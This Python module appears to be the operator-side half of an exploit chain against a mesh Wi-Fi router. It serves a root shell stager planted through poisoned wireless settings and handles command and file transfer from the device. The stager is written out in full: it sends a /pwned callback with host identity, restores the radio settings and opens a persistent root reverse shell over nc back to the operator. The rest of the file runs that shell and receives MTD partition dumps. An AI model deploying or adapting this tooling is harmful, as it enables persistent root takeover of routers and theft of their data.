#!/usr/bin/env python3
"""Operator-side plumbing: stager delivery, a durable root command channel,
and a bulk file sink.

Three listeners run on the operator's laptop for the whole session. Each binds
only the router-facing address, requires the expected router source address,
and authenticates with a per-run token stored in the private resume manifest:

  HTTP  :8000   serves /s (the stager the root eval fetches) and takes the
                /pwned proof callback.
  shell :4444   the device dials in and pipes a non-interactive /bin/sh over
                it; `ShellChannel.run()` sends a command and reads back to a
                per-session marker, so we get real exit codes instead of
                scraping an interactive prompt.
  files :4445   raw bulk transfer.  `dd` piped into `nc` moves a 36 MB MTD
                partition in well under a minute, which the shell channel
                could only do via base64 at a tenth the speed.

Why a reconnecting dial-out rather than a listener on the device: cap_init
takes the AP down and brings it back with a different Wi-Fi config, so the
link drops out from under us by design.  A device-side listener would need
the operator to re-establish the connection at exactly the moment the radios
settle; a 5-second reconnect loop just heals itself.  The cost is that the
operator's IP is baked into the payload at plant time and must not change
across the Wi-Fi bounce -- which the driver checks.
"""

import http.server
import os
import queue
import random
import re
import socket
import socketserver
import string
import threading
import time

from chain import log


def normalize_peer(peer):
    """Resolve a configured hostname to the numeric IPv4 source we will see."""
    if not peer:
        return None
    host = str(peer).strip().strip("[]")
    if host.count(":") == 1 and host.rsplit(":", 1)[1].isdigit():
        host = host.rsplit(":", 1)[0]
    try:
        return socket.gethostbyname(host)
    except socket.gaierror as exc:
        raise ValueError(f"cannot resolve expected peer {peer!r}: {exc}")


# ---- stager -----------------------------------------------------------------

# Runs as root, inside cap_init, in the two-command window the eval gives us.
#
# Order matters.  The proof callback goes first so the operator knows the sink
# fired even if everything after it fails.  The Wi-Fi repair is armed before
# the command channel because cap_init is still running and is about to
# reconfigure the radios from the poisoned values -- if that happens with
# nothing watching, the AP comes back unjoinable and a Wi-Fi-only install is
# over.  The channel loop is last and never exits.
STAGER = """\
#!/bin/sh
export PATH=/usr/sbin:/usr/bin:/sbin:/bin:$PATH
A={attacker}
HP={serve_port}
SP={shell_port}
TOK={token}

wget -q -O /dev/null \
  "http://$A:$HP/$TOK/pwned?uid=$(id -u)_user=$(id -un)_host=$(uname -n)" 2>/dev/null
{{ id; uname -a; cat /proc/version; }} > /tmp/rd03v2_root 2>&1

# Put the radios back the way we found them.  cap_init writes its wireless
# config after the eval fires, so this has to watch and correct rather than
# fix things once: the poisoned values are recognisable by content, which is
# how each section is matched to the band it came from.
(
  i=0
  while [ $i -lt {repair_iters} ]; do
    i=$((i+1)); sleep {repair_interval}
    changed=0
    for s in $(uci show wireless 2>/dev/null \
               | sed -n 's/^wireless\\.\\([^.]*\\)=wifi-iface$/\\1/p'); do
      e=$(uci -q get wireless.$s.encryption 2>/dev/null)
      case "$e" in
        *wget*)
          uci -q set wireless.$s.encryption='{enc24}'
          {key24}
          changed=1 ;;
        *"sh /tmp"*)
          uci -q set wireless.$s.encryption='{enc5}'
          {key5}
          changed=1 ;;
      esac
    done
    [ "$changed" = 1 ] && {{ uci -q commit wireless; wifi reload; }}
  done
) &

# Durable root command channel.  Non-interactive sh, so there is no prompt to
# parse; the driver terminates every command with its own marker.
(
  while true; do
    rm -f /tmp/.ch; mkfifo /tmp/.ch 2>/dev/null
    {{ printf 'AUTH %s\n' "$TOK"; /bin/sh < /tmp/.ch 2>&1; }} \
      | nc $A $SP > /tmp/.ch
    sleep 5
  done
) &
"""


def build_stager(attacker, serve_port, shell_port, restore, token,
                 repair_iters=40, repair_interval=5):
    """Render the stager.

    `restore` is what read_wifi() captured before the plant: a list of
    per-band dicts.  A factory unit reports an open AP, so the default when we
    have nothing is `none` -- an open SSID is the one configuration that is
    always joinable, which is what matters when Wi-Fi is the only link.
    """
    def band(i):
        b = restore[i] if len(restore) > i else {}
        enc = (b.get("encryption") or "none").strip()
        pw = (b.get("password") or "").strip()
        if enc in ("", "none", "None"):
            return "none", "uci -q delete wireless.$s.key 2>/dev/null"
        # set_wifi_without_restart already wrote our own pwd= into .key, so
        # falling back to it keeps the AP joinable with a key we know.
        return enc, f"uci -q set wireless.$s.key='{pw or 'meshpoc12345'}'"

    enc24, key24 = band(0)
    enc5, key5 = band(1)
    return STAGER.format(
        attacker=attacker, serve_port=serve_port, shell_port=shell_port,
        token=token,
        enc24=enc24, key24=key24, enc5=enc5, key5=key5,
        repair_iters=repair_iters, repair_interval=repair_interval,
    ).encode()


def expected_wifi(restore):
    """What the operator will have to reconnect to once the stager repairs the
    radios -- printed before the trigger, because after it the link is down."""
    out = []
    for i, name in ((0, "2.4G"), (1, "5G")):
        b = restore[i] if len(restore) > i else {}
        enc = (b.get("encryption") or "none").strip()
        key = (b.get("password") or "").strip() or "meshpoc12345"
        out.append((name, b.get("ssid", "?"),
                    "open" if enc in ("", "none", "None") else f"{enc} key={key}"))
    return out


# ---- HTTP: stager delivery + proof callback ---------------------------------


class _StagerHandler(http.server.BaseHTTPRequestHandler):
    stager = b""
    callback = None      # threading.Event
    callback_path = None  # list, so the handler can hand the text back
    files = {}           # url path -> filesystem path, streamed rather than buffered
    token = ""
    expected_peer = None

    def log_message(self, fmt, *a):
        log(f"[http] {self.client_address[0]} {fmt % a}")

    def do_GET(self):
        if self.expected_peer and self.client_address[0] != self.expected_peer:
            self.send_response(403)
            self.end_headers()
            log(f"[!] http rejected unexpected peer {self.client_address[0]}")
            return
        prefix = f"/{self.token}"
        if self.path.startswith(prefix + "/pwned"):
            log(f"[+] ROOT CALLBACK: {self.path}")
            type(self).callback_path.append(self.path)
            type(self).callback.set()
            self._reply(b"ok")
            return
        if self.path == prefix + "/s" or self.path.startswith(prefix + "/s?"):
            self._reply(self.stager, "application/octet-stream")
            return
        # Images are tens of MB; stream them off disk so a retrying wget on a
        # 256 MB router cannot make the operator's process hold two copies.
        src = type(self).files.get(self.path.split("?", 1)[0])
        if src:
            size = os.path.getsize(src)
            self.send_response(200)
            self.send_header("Content-Type", "application/octet-stream")
            self.send_header("Content-Length", str(size))
            self.end_headers()
            with open(src, "rb") as fh:
                while True:
                    chunk = fh.read(262144)
                    if not chunk:
                        break
                    self.wfile.write(chunk)
            return
        self.send_response(404)
        self.end_headers()

    def _reply(self, body, ctype="text/plain"):
        self.send_response(200)
        self.send_header("Content-Type", ctype)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)


class StagerServer:
    def __init__(self, bind_ip, port, stager, token, expected_peer):
        _StagerHandler.stager = stager
        _StagerHandler.callback = threading.Event()
        _StagerHandler.callback_path = []
        _StagerHandler.files = {}
        _StagerHandler.token = token
        _StagerHandler.expected_peer = normalize_peer(expected_peer)
        socketserver.TCPServer.allow_reuse_address = True
        self.token = token
        self.httpd = socketserver.ThreadingTCPServer((bind_ip, port), _StagerHandler)
        threading.Thread(target=self.httpd.serve_forever, daemon=True).start()
        log(f"[*] http {bind_ip}:{port} serving /{token}/s ({len(stager)} B)")

    @property
    def stager_path(self):
        return f"/{self.token}/s"

    def add(self, urlpath, filepath):
        """Publish a local file at `urlpath` for the device to wget."""
        public_path = f"/{self.token}{urlpath}"
        _StagerHandler.files[public_path] = filepath
        log(f"[*] http serving {public_path} <- {filepath}")
        return public_path

    @property
    def callback(self):
        return _StagerHandler.callback

    @property
    def callback_path(self):
        return _StagerHandler.callback_path[0] if _StagerHandler.callback_path else None

    def stop(self):
        self.httpd.shutdown()


# ---- shell channel ----------------------------------------------------------


class ShellChannel:
    """A root /bin/sh the device dials back to, driven command-at-a-time.

    Reconnects are expected and normal (the Wi-Fi bounce, and the 5s retry
    loop in the stager), so the accept loop simply keeps the newest connection
    and `run()` waits for one to exist.  Each connection is a fresh shell, so
    commands must be self-contained -- no `cd` that later calls depend on.
    """

    def __init__(self, bind_ip, port, token, expected_peer):
        self.port = port
        self.sock = None
        self.lock = threading.Lock()
        self.connected = threading.Event()
        self.marker = "__RD03V2_" + "".join(
            random.choice(string.ascii_uppercase) for _ in range(8)) + "_"
        self._buf = b""
        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv.bind((bind_ip, port))
        self._srv.listen(4)
        self.token = token
        self.expected_peer = normalize_peer(expected_peer)
        self._seq = 0
        threading.Thread(target=self._accept_loop, daemon=True).start()
        log(f"[*] shell channel listening on {bind_ip}:{port}")

    def _accept_loop(self):
        while True:
            try:
                c, addr = self._srv.accept()
            except OSError:
                return
            if self.expected_peer and addr[0] != self.expected_peer:
                log(f"[!] shell rejected unexpected peer {addr[0]}")
                c.close()
                continue
            try:
                c.settimeout(10)
                auth = b""
                while b"\n" not in auth and len(auth) <= 128:
                    chunk = c.recv(1)
                    if not chunk:
                        break
                    auth += chunk
                if auth.rstrip(b"\r\n") != f"AUTH {self.token}".encode():
                    log(f"[!] shell rejected unauthenticated peer {addr[0]}")
                    c.close()
                    continue
            except OSError:
                c.close()
                continue
            with self.lock:
                if self.sock is not None:
                    try:
                        self.sock.close()
                    except OSError:
                        pass
                c.settimeout(None)
                self.sock = c
                self._buf = b""
                self.connected.set()
            log(f"[+] root shell connected from {addr[0]}:{addr[1]}")

    def wait(self, timeout=180):
        return self.connected.wait(timeout)

    def _drop(self):
        with self.lock:
            if self.sock is not None:
                try:
                    self.sock.close()
                except OSError:
                    pass
            self.sock = None
            self._buf = b""
            self.connected.clear()

    def run(self, cmd, timeout=120, retries=2, quiet=False):
        """Send one shell command; return (rc, output).

        Retries across a reconnect by default: everything the probe runs is
        read-only, so replaying a command that died with the link is safe.
        Pass retries=0 for anything that writes.
        """
        last = None
        for attempt in range(retries + 1):
            if not self.connected.wait(timeout=60):
                last = TimeoutError("no shell connection")
                continue
            try:
                return self._run_once(cmd, timeout, quiet)
            except (OSError, TimeoutError) as e:
                last = e
                log(f"    (shell dropped during {cmd[:40]!r}: {type(e).__name__})")
                self._drop()
                time.sleep(3)
        raise ChannelError(f"command failed after {retries + 1} attempts: {last}")

    def _run_once(self, cmd, timeout, quiet):
        self._seq += 1
        mark = f"{self.marker}{self._seq}:"
        line = f"{cmd}\necho \"{mark}$?\"\n".encode()
        with self.lock:
            sock = self.sock
            if sock is None:
                raise OSError("no connection")
            sock.sendall(line)
        pat = re.compile(re.escape(mark).encode() + rb"(\d+)")
        deadline = time.time() + timeout
        while True:
            m = pat.search(self._buf)
            if m:
                out = self._buf[:m.start()]
                self._buf = self._buf[m.end():].lstrip(b"\r\n")
                rc = int(m.group(1))
                text = out.decode("utf-8", "replace").strip("\r\n")
                if not quiet:
                    log(f"    $ {cmd[:70]}{'...' if len(cmd) > 70 else ''} -> rc={rc}")
                return rc, text
            if time.time() > deadline:
                raise TimeoutError(f"no marker within {timeout}s for: {cmd[:60]}")
            with self.lock:
                sock = self.sock
            if sock is None:
                raise OSError("connection lost")
            sock.settimeout(5.0)
            try:
                chunk = sock.recv(65536)
            except socket.timeout:
                continue
            if not chunk:
                raise OSError("connection closed")
            self._buf += chunk


class ChannelError(Exception):
    pass


# ---- bulk file sink ---------------------------------------------------------


class FileSink:
    """Receives `{ echo "FILE <name> <size>"; <producer>; } | nc host port`.

    The declared size is load-bearing: BusyBox `nc` does not reliably close
    the connection when its stdin ends, so we close from this side once the
    expected number of bytes has arrived rather than waiting for EOF.
    """

    def __init__(self, bind_ip, port, outdir, token, expected_peer,
                 expected_files):
        self.port = port
        self.outdir = outdir
        self.done = queue.Queue()
        self.token = token
        self.expected_peer = normalize_peer(expected_peer)
        self.expected_files = dict(expected_files)
        self.received = set()
        self.state_lock = threading.Lock()
        self._srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._srv.bind((bind_ip, port))
        self._srv.listen(4)
        threading.Thread(target=self._accept_loop, daemon=True).start()
        log(f"[*] file sink listening on {bind_ip}:{port} -> {outdir}")

    def _accept_loop(self):
        while True:
            try:
                c, addr = self._srv.accept()
            except OSError:
                return
            if self.expected_peer and addr[0] != self.expected_peer:
                log(f"[!] file sink rejected unexpected peer {addr[0]}")
                c.close()
                continue
            threading.Thread(target=self._recv, args=(c,), daemon=True).start()

    def _recv(self, c):
        name = None
        try:
            c.settimeout(300)
            head = b""
            while b"\n" not in head:
                b = c.recv(1)
                if not b:
                    return
                head += b
            if head.decode("ascii", "replace").strip() != f"AUTH {self.token}":
                log("[!] file sink: invalid authentication")
                return
            head = b""
            while b"\n" not in head and len(head) <= 512:
                b = c.recv(1)
                if not b:
                    return
                head += b
            parts = head.decode("utf-8", "replace").strip().split()
            if len(parts) != 3 or parts[0] != "FILE":
                log(f"[!] file sink: bad header {head!r}")
                return
            name, size = parts[1], int(parts[2])
            if name not in self.expected_files or size != self.expected_files[name]:
                log(f"[!] file sink: unexpected transfer {name!r} ({size} B)")
                return
            with self.state_lock:
                if name in self.received:
                    log(f"[!] file sink: duplicate transfer {name!r}")
                    return
                self.received.add(name)
            root = os.path.realpath(self.outdir)
            path = os.path.realpath(os.path.join(root, name))
            if os.path.dirname(path) != root or os.path.basename(path) != name:
                log(f"[!] file sink: unsafe filename {name!r}")
                return
            got = 0
            t0 = time.time()
            with open(path, "wb") as fh:
                while got < size:
                    chunk = c.recv(min(262144, size - got))
                    if not chunk:
                        break
                    fh.write(chunk)
                    got += len(chunk)
            os.chmod(path, 0o600)
            dt = max(time.time() - t0, 0.001)
            ok = got == size
            if not ok:
                with self.state_lock:
                    self.received.discard(name)
            log(f"[{'+' if ok else '!'}] received {name}: {got}/{size} B "
                f"in {dt:.1f}s ({got/dt/1024:.0f} KB/s)")
            self.done.put((name, path, got, size))
        except Exception as e:                                  # noqa: BLE001
            log(f"[!] file sink error on {name}: {type(e).__name__}: {e}")
            if name:
                with self.state_lock:
                    self.received.discard(name)
            self.done.put((name, None, 0, 0))
        finally:
            try:
                c.close()
            except OSError:
                pass

    def wait(self, timeout=300):
        """Block for the next completed transfer; returns (name, path, got, size)."""
        try:
            return self.done.get(timeout=timeout)
        except queue.Empty:
            return (None, None, 0, 0)
